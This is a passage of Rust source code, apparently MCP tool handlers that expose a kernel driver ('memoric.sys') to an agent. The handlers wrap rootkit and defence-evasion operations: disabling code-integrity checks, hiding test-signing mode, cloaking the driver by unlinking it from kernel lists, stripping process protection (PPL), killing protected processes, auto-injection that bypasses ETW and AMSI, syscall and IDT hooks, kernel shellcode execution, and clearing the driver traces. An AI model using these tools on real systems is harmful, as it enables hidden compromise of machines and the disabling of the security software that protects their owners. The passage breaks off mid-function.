            let protect_pid = protect_pid.expect("obj_action=register requires protect_pid");
            drv.object_hook_register(protect_pid, strip_access)
                .map_err(|e| e.to_string())?;
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_object_hook",
                "driver": "memoric.sys",
                "action": "register",
                "protect_pid": protect_pid,
                "strip_access": format!("0x{:08X}", strip_access),
                "message": format!("Object callback registered: PID {} protected, stripping access 0x{:08X} from all handle opens", protect_pid, strip_access)
            }))
        }
        "unregister" => {
            drv.object_hook_unregister().map_err(|e| e.to_string())?;
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_object_hook",
                "driver": "memoric.sys",
                "action": "unregister",
                "message": "Object callback unregistered — process protection removed"
            }))
        }
        "query" => {
            let resp = drv.object_hook_query().map_err(|e| e.to_string())?;
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_object_hook",
                "driver": "memoric.sys",
                "action": "query",
                "registered": resp.registered != 0,
                "interception_count": resp.interception_count,
                "protected_pid": resp.protected_pid,
                "stripped_access": format!("0x{:08X}", resp.stripped_access)
            }))
        }
        _ => unreachable!("obj_action was validated before driver open"),
    }
}

fn driver_stats(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let _normalized_args = normalized_kernel_registry_args(args, "driver_stats")?;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let s = drv.driver_stats().map_err(|e| e.to_string())?;

    let version_major = s.driver_version >> 16;
    let version_minor = s.driver_version & 0xFFFF;

    Ok(json!({
        "success": true,
        "technique": "memoric_driver_stats",
        "driver": "memoric.sys",
        "version": format!("{}.{}", version_major, version_minor),
        "build_number": s.build_number,
        "offsets_resolved": s.offsets_resolved != 0,
        "offset_profile": s.offset_profile_json(),
        "ioctls": {
            "total": s.total_ioctls,
            "success": s.success_ioctls,
            "failed": s.failed_ioctls,
            "exceptions": s.exception_count
        },
        "handles": s.open_handles,
        "callbacks": {
            "process_notify": s.notify_process_active != 0,
            "thread_notify": s.notify_thread_active != 0,
            "image_notify": s.notify_image_active != 0,
            "registry_callback": s.reg_callback_active != 0,
            "object_callback": s.ob_callback_active != 0
        },
        "active_features": {
            "dpc_timers": s.dpc_timers_active,
            "hidden_ports": s.hidden_port_count,
            "protected_keys": s.protected_key_count
        },
        "message": format!("Driver v{}.{} — {} IOCTLs ({}ok/{}fail/{}ex), {} handles, build {}",
            version_major, version_minor,
            s.total_ioctls, s.success_ioctls, s.failed_ioctls, s.exception_count,
            s.open_handles, s.build_number)
    }))
}

fn driver_memory_pool(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let normalized_args = normalized_kernel_registry_args(args, "driver_memory_pool")?;
    let pool_tag = parse_u64_arg(normalized_args.get("pool_tag")).unwrap_or(0) as u32;
    let max_entries = optional_bounded_u64_param(
        &normalized_args,
        "max_entries",
        "kernel",
        "driver_memory_pool",
        256,
    )? as u32;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;

    let (header, entries) = drv
        .memory_pool_query(pool_tag, max_entries)
        .map_err(|e| e.to_string())?;

    let entries_json: Vec<Value> = entries
        .iter()
        .map(|e| {
            let tag_bytes = e.pool_tag.to_le_bytes();
            let tag_str = String::from_utf8_lossy(&tag_bytes).to_string();
            json!({
                "tag": tag_str,
                "tag_raw": format!("0x{:08X}", e.pool_tag),
                "address": format!("0x{:016X}", e.address),
                "size": e.size,
                "pool_type": if e.pool_type == 0 { "NonPaged" } else { "Paged" }
            })
        })
        .collect();

    Ok(json!({
        "success": true,
        "technique": "memoric_memory_pool",
        "entry_count": header.entry_count,
        "total_allocations": header.total_allocations,
        "entries": entries_json,
        "message": format!("Pool query: {} entries returned ({} total matching)",
            header.entry_count, header.total_allocations)
    }))
}

fn driver_minifilter_enum(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let _normalized_args = normalized_kernel_registry_args(args, "driver_minifilter_enum")?;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let entries = drv.minifilter_enum().map_err(|e| e.to_string())?;

    let entries_json: Vec<Value> = entries
        .iter()
        .map(|e| {
            let name = String::from_utf16_lossy(&e.filter_name)
                .trim_end_matches('\0')
                .to_string();
            let altitude = String::from_utf16_lossy(&e.altitude)
                .trim_end_matches('\0')
                .to_string();
            json!({
                "name": name,
                "altitude": altitude,
                "frame_id": e.frame_id,
                "instances": e.number_of_instances,
                "flags": format!("0x{:08X}", e.flags)
            })
        })
        .collect();

    Ok(json!({
        "success": true,
        "technique": "memoric_minifilter_enum",
        "filter_count": entries.len(),
        "filters": entries_json,
        "message": format!("Found {} filter drivers", entries.len())
    }))
}

fn driver_process_dump(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let normalized_args = normalized_kernel_registry_args(args, "driver_process_dump")?;
    let args = &normalized_args;
    let pid = require_u64_param(args, "pid", "kernel", "driver_process_dump")? as u32;
    let flags = parse_u64_arg(args.get("flags")).unwrap_or(0) as u32;
    let base_address = parse_address_arg(args.get("base_address")).unwrap_or(0);
    let max_size = if args.get("max_size").is_some() {
        optional_bounded_u64_param(args, "max_size", "kernel", "driver_process_dump", 0)?
    } else {
        optional_bounded_u64_param(args, "max_dump_size", "kernel", "driver_process_dump", 0)?
    };

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let (header, regions) = drv
        .process_dump(pid, flags, base_address, max_size)
        .map_err(|e| e.to_string())?;

    let regions_json: Vec<Value> = regions
        .iter()
        .map(|r| {
            let state_str = match r.state {
                0x1000 => "MEM_COMMIT",
                0x2000 => "MEM_RESERVE",
                0x10000 => "MEM_FREE",
                _ => "UNKNOWN",
            };
            let type_str = match r.region_type {
                0x1000000 => "MEM_IMAGE",
                0x40000 => "MEM_MAPPED",
                0x20000 => "MEM_PRIVATE",
                _ => "UNKNOWN",
            };
            json!({
                "base": format!("0x{:016X}", r.base_address),
                "size": r.region_size,
                "state": state_str,
                "protect": format!("0x{:08X}", r.protect),
                "type": type_str
            })
        })
        .collect();
    let should_export = output_path_from_args(args).is_some()
        || regions_json.len() > AUTO_KERNEL_DUMP_REGION_ARTIFACT_THRESHOLD;
    let artifact = if should_export {
        let payload = json!({
            "kind": "kernel-process-dump-regions",
            "pid": pid,
            "region_count": header.region_count,
            "total_regions": header.total_regions,
            "total_size": header.total_size,
            "regions": regions_json,
            "redaction_status": "artifact"
        });
        let bytes = serde_json::to_vec_pretty(&payload)
            .map_err(|e| format!("serialize process dump artifact: {}", e))?;
        Some(write_kernel_artifact_bytes(
            args,
            "driver-process-dump",
            Some(pid),
            &bytes,
            "json",
        )?)
    } else {
        None
    };
    let inline_regions = artifact.is_none();

    let mut result = json!({
        "success": true,
        "technique": "memoric_process_dump",
        "pid": pid,
        "region_count": header.region_count,
        "total_regions": header.total_regions,
        "total_size": header.total_size,
        "regions": if inline_regions { regions_json } else { Vec::<Value>::new() },
        "redaction_status": if inline_regions { "inline" } else { "artifact" },
        "message": format!("Process {} dump: {} regions, {} bytes total",
            pid, header.region_count, header.total_size)
    });
    if let Some(artifact) = artifact {
        if let Some(obj) = result.as_object_mut() {
            obj.insert("artifact".to_string(), artifact.clone());
            obj.insert(
                "output_path".to_string(),
                json!(artifact["path"].as_str().unwrap_or_default()),
            );
            obj.insert("exported_count".to_string(), json!(header.region_count));
            obj.insert(
                "export_reason".to_string(),
                json!(if output_path_from_args(args).is_some() {
                    "explicit_output_path"
                } else {
                    "large_region_list_auto"
                }),
            );
        }
    }

    Ok(result)
}

fn driver_hypervisor_detect(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let _normalized_args = normalized_kernel_registry_args(args, "driver_hypervisor_detect")?;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv.hypervisor_detect().map_err(|e| e.to_string())?;

    let vendor = String::from_utf8_lossy(&r.vendor_id)
        .trim_end_matches('\0')
        .to_string();
    let type_str = match r.hypervisor_type {
        0 => "None",
        1 => "Hyper-V",
        2 => "VMware",
        3 => "VirtualBox",
        4 => "KVM",
        5 => "QEMU",
        6 => "Xen",
        7 => "Unknown",
        _ => "Unknown",
    };

    Ok(json!({
        "success": true,
        "technique": "memoric_kernel_hypervisor_detect",
        "hypervisor_present": r.hypervisor_present != 0,
        "hypervisor_type": type_str,
        "vendor_id": vendor,
        "nesting_level": r.nesting_level,
        "anomalies": {
            "timing": r.timing_anomaly != 0,
            "msr": r.msr_anomaly != 0,
            "idt": r.idt_anomaly != 0
        },
        "cpuid_leaf_count": r.cpuid_leaf_count,
        "message": format!("Hypervisor: {} ({}), vendor='{}', anomalies: timing={} msr={} idt={}",
            if r.hypervisor_present != 0 { "PRESENT" } else { "NOT PRESENT" },
            type_str, vendor,
            r.timing_anomaly != 0, r.msr_anomaly != 0, r.idt_anomaly != 0)
    }))
}

fn driver_testsign_hide(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let normalized_args = normalized_kernel_registry_args(args, "driver_testsign_hide")?;
    let ts_action = normalized_args
        .get("testsign_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match ts_action {
        "query" => TESTSIGN_QUERY,
        "hide_shared" => TESTSIGN_HIDE_SHARED,
        "hide_ci" => TESTSIGN_HIDE_CI,
        "restore" => TESTSIGN_RESTORE,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_testsign_hide",
                "testsign_action",
                ts_action,
            ))
        }
    };

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv.testsign_hide(action_code).map_err(|e| e.to_string())?;

    Ok(json!({
        "success": true,
        "technique": "memoric_kernel_testsign_hide",
        "action": ts_action,
        "test_signing_active": r.test_signing_active != 0,
        "ci_options": format!("0x{:X}", r.ci_options),
        "shared_user_patched": r.shared_user_patched != 0,
        "ci_options_address": format!("0x{:016X}", r.ci_options_address),
        "shared_user_address": format!("0x{:016X}", r.shared_user_address),
        "message": format!("TestSign {}: active={}, ci_options=0x{:X}, shared_patched={}",
            ts_action, r.test_signing_active != 0, r.ci_options, r.shared_user_patched != 0)
    }))
}

fn driver_global_hook(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let gh_action = args
        .get("hook_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match gh_action {
        "install" => GHOOK_INSTALL,
        "remove" => GHOOK_REMOVE,
        "query" => GHOOK_QUERY,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_global_hook",
                "hook_action",
                gh_action,
            ))
        }
    };

    let hook_type_str = args
        .get("hook_type")
        .and_then(|v| v.as_str())
        .unwrap_or("inline");
    let hook_type = match hook_type_str {
        "inline" => GHOOK_TYPE_INLINE,
        "iat" => GHOOK_TYPE_IAT,
        "infinity" => GHOOK_TYPE_INFINITY,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_global_hook",
                "hook_type",
                hook_type_str,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_global_hook")?;
    let args = &normalized_args;
    let module = match args.get("target_module") {
        Some(_) => require_module_name_param(
            args,
            "target_module",
            "kernel",
            "driver_global_hook",
            Some("Provide a kernel module base name, e.g. target_module='ntoskrnl.exe'."),
        )?,
        None => "",
    };
    let hook_index = parse_u64_arg(args.get("hook_index")).unwrap_or(0) as u32;
    let function = args
        .get("target_function")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let replacement = parse_address_arg(args.get("replacement_addr")).unwrap_or(0);

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let output = drv
        .global_hook(
            action_code,
            hook_type,
            hook_index,
            module,
            function,
            replacement,
        )
        .map_err(|e| e.to_string())?;

    if output.len() >= std::mem::size_of::<GlobalHookResponse>() {
        let resp = unsafe { &*(output.as_ptr() as *const GlobalHookResponse) };
        Ok(json!({
            "success": true,
            "technique": "memoric_kernel_global_hook",
            "action": gh_action,
            "hook_count": resp.hook_count,
            "message": format!("GlobalHook {}: {} active hooks", gh_action, resp.hook_count)
        }))
    } else {
        Ok(json!({
            "success": true,
            "technique": "memoric_kernel_global_hook",
            "action": gh_action,
            "message": format!("GlobalHook {} completed", gh_action)
        }))
    }
}

fn driver_auto_inject(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let normalized_args = normalized_kernel_registry_args(args, "driver_auto_inject")?;
    let ai_action = normalized_args
        .get("inject_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match ai_action {
        "enable" => AUTOINJECT_ENABLE,
        "disable" => AUTOINJECT_DISABLE,
        "query" => AUTOINJECT_QUERY,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_auto_inject",
                "inject_action",
                ai_action,
            ))
        }
    };
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;

    let mut flags: u32 = 0;
    if let Some(f) = normalized_args.get("inject_flags") {
        if let Some(arr) = f.as_array() {
            for flag in arr {
                match flag.as_str().unwrap_or("") {
                    "ntquery" => flags |= AUTOINJECT_FLAG_NTQUERY,
                    "etw" => flags |= AUTOINJECT_FLAG_ETW,
                    "amsi" => flags |= AUTOINJECT_FLAG_AMSI,
                    "custom" => flags |= AUTOINJECT_FLAG_CUSTOM,
                    _ => {}
                }
            }
        } else if let Some(n) = f.as_u64() {
            flags = n as u32;
        }
    }

    let filter = normalized_args
        .get("process_filter")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let r = drv
        .auto_inject(action_code, flags, filter)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": true,
        "technique": "memoric_kernel_auto_inject",
        "action": ai_action,
        "enabled": r.enabled != 0,
        "flags": r.flags,
        "processes_injected": r.processes_injected,
        "processes_failed": r.processes_failed,
        "processes_skipped": r.processes_skipped,
        "process_filter": r.filter_str(),
        "message": format!("AutoInject {}: enabled={}, injected={}, failed={}, skipped={}",
            ai_action, r.enabled != 0, r.processes_injected, r.processes_failed, r.processes_skipped)
    }))
}

fn driver_infinity_hook(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let ih_action = args
        .get("infhook_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match ih_action {
        "enable" => INFHOOK_ENABLE,
        "disable" => INFHOOK_DISABLE,
        "query" => INFHOOK_QUERY,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_infinity_hook",
                "infhook_action",
                ih_action,
            ))
        }
    };

    let normalized_args = normalized_kernel_registry_args(args, "driver_infinity_hook")?;
    let args = &normalized_args;
    let syscall_number = parse_u64_arg(args.get("syscall_number")).unwrap_or(0) as u32;
    let handler = parse_address_arg(args.get("handler_address")).unwrap_or(0);

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .infinity_hook(action_code, syscall_number, handler)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": true,
        "technique": "memoric_kernel_infinity_hook",
        "action": ih_action,
        "enabled": r.enabled != 0,
        "syscall_number": r.syscall_number,
        "interception_count": r.interception_count,
        "get_cpu_clock_addr": format!("0x{:016X}", r.get_cpu_clock_addr),
        "original_handler": format!("0x{:016X}", r.original_handler),
        "message": format!("InfinityHook {}: enabled={}, syscall={}, intercepts={}",
            ih_action, r.enabled != 0, r.syscall_number, r.interception_count)
    }))
}

fn driver_ci_callback_patch(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let normalized_args = normalized_kernel_registry_args(args, "driver_ci_callback_patch")?;
    let action = normalized_args
        .get("ci_action")
        .and_then(|v| v.as_str())
        .unwrap_or("patch");
    let action_code = match action {
        "patch" => CI_CALLBACK_PATCH,
        "restore" => CI_CALLBACK_RESTORE,
        "query" => CI_CALLBACK_QUERY,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_ci_callback_patch",
                "ci_action",
                action,
            ))
        }
    };

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .ci_callback_patch(action_code)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "se_ci_callbacks_swap",
        "action": action,
        "patched": r.patched == 1,
        "se_ci_callbacks_addr": format!("0x{:016X}", r.se_ci_callbacks_addr),
        "original_ptr": format!("0x{:016X}", r.original_ptr),
        "current_ptr": format!("0x{:016X}", r.current_ptr),
        "zw_flush_addr": format!("0x{:016X}", r.zw_flush_addr),
    }))
}

fn driver_ci_func_patch(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let normalized_args = normalized_kernel_registry_args(args, "driver_ci_func_patch")?;
    let action = normalized_args
        .get("ci_action")
        .and_then(|v| v.as_str())
        .unwrap_or("patch");
    let action_code = match action {
        "patch" => CI_FUNC_PATCH,
        "restore" => CI_FUNC_RESTORE,
        "query" => CI_FUNC_QUERY,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_ci_func_patch",
                "ci_action",
                action,
            ))
        }
    };

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv.ci_func_patch(action_code).map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "ci_validate_image_header_patch",
        "action": action,
        "patched": r.patched == 1,
        "ci_validate_addr": format!("0x{:016X}", r.ci_validate_addr),
        "original_bytes": format!("{:02X?}", &r.original_bytes[..4]),
        "current_bytes": format!("{:02X?}", &r.current_bytes[..4]),
    }))
}

fn driver_pte_rw(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let action = args
        .get("pte_action")
        .and_then(|v| v.as_str())
        .unwrap_or("read");
    let action_code = match action {
        "read" => PTE_READ,
        "write" => PTE_WRITE,
        "make_writable" => PTE_MAKE_WRITABLE,
        "restore" => PTE_RESTORE,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_pte_rw",
                "pte_action",
                action,
            ))
        }
    };

    let normalized_args = normalized_kernel_registry_args(args, "driver_pte_rw")?;
    let args = &normalized_args;
    let va = require_u64_param(args, "address", "kernel", "driver_pte_rw")?;
    let new_pte = parse_u64_arg(args.get("new_pte")).unwrap_or(0);

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .pte_rw(action_code, va, new_pte)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "pte_manipulation",
        "action": action,
        "virtual_address": format!("0x{:016X}", r.virtual_address),
        "pte_address": format!("0x{:016X}", r.pte_address),
        "pte_value": format!("0x{:016X}", r.pte_value),
        "original_pte_value": format!("0x{:016X}", r.original_pte_value),
        "pte_base": format!("0x{:016X}", r.pte_base),
        "writable": (r.pte_value & 2) != 0,
        "present": (r.pte_value & 1) != 0,
    }))
}

fn driver_msr_rw(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let action = args
        .get("msr_action")
        .and_then(|v| v.as_str())
        .unwrap_or("read");
    let action_code = match action {
        "read" => MSR_READ,
        "write" => MSR_WRITE,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_msr_rw",
                "msr_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_msr_rw")?;
    let args = &normalized_args;
    let msr_index = parse_u64_arg(args.get("msr_index")).unwrap_or(0) as u32;
    let msr_value = parse_u64_arg(args.get("msr_value")).unwrap_or(0);

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .msr_rw(action_code, msr_index, msr_value)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "msr_manipulation",
        "action": action,
        "msr_index": format!("0x{:X}", r.msr_index),
        "value": format!("0x{:016X}", r.value),
        "old_value": format!("0x{:016X}", r.old_value),
        "common_msrs": {
            "IA32_LSTAR": "0xC0000082 (syscall entry)",
            "IA32_EFER": "0xC0000080 (extended features)",
            "IA32_DEBUGCTL": "0x1D9 (debug control)",
            "IA32_SYSENTER_EIP": "0x176 (legacy syscall)"
        }
    }))
}

fn driver_cloak(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let action = args
        .get("cloak_action")
        .and_then(|v| v.as_str())
        .unwrap_or("self");
    let action_code = match action {
        "self" => CLOAK_SELF,
        "target" => CLOAK_TARGET,
        "query" => CLOAK_QUERY,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_cloak",
                "cloak_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_cloak")?;
    let args = &normalized_args;
    let driver_name = args.get("driver_name").and_then(|v| v.as_str());

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .driver_cloak(action_code, driver_name)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "dkom_driver_unlink",
        "action": action,
        "cloaked": r.cloaked == 1,
        "driver_object": format!("0x{:016X}", r.driver_object_addr),
        "driver_section": format!("0x{:016X}", r.driver_section_addr),
        "entries_removed": r.entries_removed,
    }))
}

fn driver_force_kill(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let normalized_args = normalized_kernel_registry_args(args, "driver_force_kill")?;
    let method = normalized_args
        .get("kill_method")
        .and_then(|v| v.as_str())
        .unwrap_or("terminate");
    let action_code = match method {
        "terminate" => KILL_TERMINATE,
        "dkom" => KILL_DKOM,
        "thread_kill" => KILL_THREAD_KILL,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_force_kill",
                "kill_method",
                method,
            ))
        }
    };
    let pid = require_u32_param(&normalized_args, "pid", "kernel", "driver_force_kill")?;
    let exit_code = parse_u64_arg(normalized_args.get("exit_code")).unwrap_or(1) as u32;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .force_kill(action_code, pid, exit_code)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "kernel_force_kill",
        "method": method,
        "process_id": r.process_id,
        "eprocess": format!("0x{:016X}", r.eprocess_addr),
        "description": match method {
            "terminate" => "ZwTerminateProcess from kernel mode — bypasses PPL",
            "dkom" => "DKOM unlink from ActiveProcessLinks — process vanishes",
            "thread_kill" => "Suspend + terminate — reliable for stubborn processes",
            _ => "unknown"
        }
    }))
}

fn driver_force_delete(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let normalized_args = normalized_kernel_registry_args(args, "driver_force_delete")?;
    let args = &normalized_args;
    let file_path = require_str_param(
        args,
        "file_path",
        "kernel",
        "driver_force_delete",
        Some("Use NT path format like \\??\\C:\\path\\to\\file."),
    )?;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv.force_delete(file_path).map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "kernel_file_delete",
        "file_path": file_path,
        "nt_status": format!("0x{:08X}", r.nt_status),
    }))
}

fn driver_system_thread(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let action = args
        .get("thread_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match action {
        "create" => THREAD_CREATE,
        "query" => THREAD_QUERY,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_system_thread",
                "thread_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_system_thread")?;
    let args = &normalized_args;
    let start_address = parse_address_arg(args.get("thread_start")).unwrap_or(0);
    let context = parse_address_arg(args.get("thread_context")).unwrap_or(0);

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .system_thread(action_code, start_address, context)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "kernel_system_thread",
        "action": action,
        "thread_handle": format!("0x{:016X}", r.thread_handle),
        "thread_id": r.thread_id,
    }))
}

fn driver_kernel_exec(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let action = args
        .get("exec_action")
        .and_then(|v| v.as_str())
        .unwrap_or("run");
    let action_code = match action {
        "run" => EXEC_RUN,
        "alloc" => EXEC_ALLOC,
        "free" => EXEC_FREE,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_kernel_exec",
                "exec_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_kernel_exec")?;
    let args = &normalized_args;
    let shellcode: Vec<u8> = args
        .get("shellcode_bytes")
        .and_then(|v| v.as_array())
        .map(|arr| {
            arr.iter()
                .filter_map(|v| v.as_u64().map(|n| n as u8))
                .collect()
        })
        .unwrap_or_default();
    let alloc_addr = parse_address_arg(args.get("alloc_address")).unwrap_or(0);

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .kernel_exec(action_code, &shellcode, alloc_addr)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": r.success == 1,
        "technique": "kernel_shellcode_exec",
        "action": action,
        "allocated_address": format!("0x{:016X}", r.allocated_address),
        "return_value": format!("0x{:016X}", r.return_value),
    }))
}

// === Phase 12 remaining MCP tools ===

fn driver_ppl_bypass(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let action = args
        .get("ppl_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match action {
        "strip" => PPL_STRIP,
        "set" => PPL_SET,
        "query" => PPL_QUERY,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_ppl_bypass",
                "ppl_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_ppl_bypass")?;
    let args = &normalized_args;
    let pid = parse_u64_arg(args.get("pid")).unwrap_or(0) as u32;
    let level = parse_u64_arg(args.get("protection_level")).unwrap_or(0) as u8;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .ppl_bypass(action_code, pid, level)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "ppl_bypass",
        "action": action,
        "pid": r.process_id,
        "eprocess": format!("0x{:016X}", r.eprocess_addr),
        "old_protection": format!("0x{:02X}", r.old_protection),
        "new_protection": format!("0x{:02X}", r.new_protection),
    }))
}

fn driver_cr_rw(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let action = args
        .get("cr_action")
        .and_then(|v| v.as_str())
        .unwrap_or("read");
    let action_code = match action {
        "read" => CR_READ,
        "write" => CR_WRITE,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_cr_rw",
                "cr_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_cr_rw")?;
    let args = &normalized_args;
    let cr_index =
        optional_bounded_u64_param(args, "cr_index", "kernel", "driver_cr_rw", 0)? as u32;
    let value = parse_u64_arg(args.get("value")).unwrap_or(0);
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .cr_rw(action_code, cr_index, value)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "control_register_rw",
        "action": action,
        "cr_index": r.cr_index,
        "value": format!("0x{:016X}", r.value),
        "old_value": format!("0x{:016X}", r.old_value),
    }))
}

fn driver_idt_rw(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let action = args
        .get("idt_action")
        .and_then(|v| v.as_str())
        .unwrap_or("read");
    let action_code = match action {
        "read" => IDT_READ,
        "write" => IDT_WRITE,
        "dump" => IDT_DUMP,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_idt_rw",
                "idt_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_idt_rw")?;
    let args = &normalized_args;
    let vector = optional_bounded_u64_param(args, "vector", "kernel", "driver_idt_rw", 0)? as u32;
    let new_handler = parse_address_arg(args.get("new_handler")).unwrap_or(0);
    let new_dpl = optional_bounded_u64_param(args, "new_dpl", "kernel", "driver_idt_rw", 0)? as u16;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .idt_rw(action_code, vector, new_handler, new_dpl)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "idt_manipulation",
        "action": action,
        "vector": r.vector,
        "handler": format!("0x{:016X}", r.handler_address),
        "old_handler": format!("0x{:016X}", r.old_handler_address),
        "segment": format!("0x{:04X}", r.segment),
        "dpl": r.dpl,
        "gate_type": r.gate_type,
        "present": r.present,
        "idt_base": format!("0x{:016X}", r.idt_base),
        "idt_limit": r.idt_limit,
    }))
}

fn driver_unloaded_drv_clear(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let action = args
        .get("unloaded_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match action {
        "query" => UNLOADED_QUERY,
        "clear_all" => UNLOADED_CLEAR_ALL,
        "clear_name" => UNLOADED_CLEAR_NAME,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_unloaded_drv_clear",
                "unloaded_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_unloaded_drv_clear")?;
    let args = &normalized_args;
    let driver_name = args.get("driver_name").and_then(|v| v.as_str());
    let drv =
